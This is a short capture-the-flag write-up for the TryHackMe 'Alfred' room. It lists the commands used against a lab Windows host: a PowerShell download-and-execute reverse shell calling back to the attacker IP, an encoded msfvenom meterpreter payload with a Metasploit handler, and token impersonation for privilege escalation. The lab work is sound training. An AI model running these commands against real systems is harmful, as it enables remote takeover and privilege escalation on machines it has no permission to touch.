# Writeup for [Alfred](https://tryhackme.com/room/alfred)

```
set -gx IP 10.10.43.0
```


## Task 1: Initial Access

* default windows nmap scan `nmap -sV -A -Pn -oN nmap/initial $IP`
* try default passwords
* download reverse shell script on attacker machine
* download reverse shell on victim `powershell iex (New-Object Net.WebClient).DownloadString('http://10.8.60.141:8888);Invoke-PowerShellTcp -Reverse -IPAddress 10.8.60.141 -Port 8889`


## Task 2: Switching Shells

* generate meterpreter reverse tcp `msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.8.60.141 LPORT=8887 -f exe -o meterpreter_shell.exe`
* download it from victim `powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.8.60.141:8888/meterpreter_shell.exe','meterpreter_shell.exe')"`
* start multihandler
  * `use exploit/multi/handler`
  * `set PAYLOAD windows/meterpreter/reverse_tcp`
  * `set LHOST 10.8.60.141`
  * `set LPORT 8887`
  * `run`
* execute reverse shell `Start-Process meterpreter_shell.exe`


## Task 3: Privilege Escalation

* check if impersonation available `whoami /priv`
* load incognito module `load incognito`
* list tokens `list_tokens -g`
* use Admin token `impersonate_token "BUILTIN\Administrators"`
* reveal current group `getuid`
* list all processes `ps`
* migrate to process with higher permissions `migrate <pid>`
* find the flag
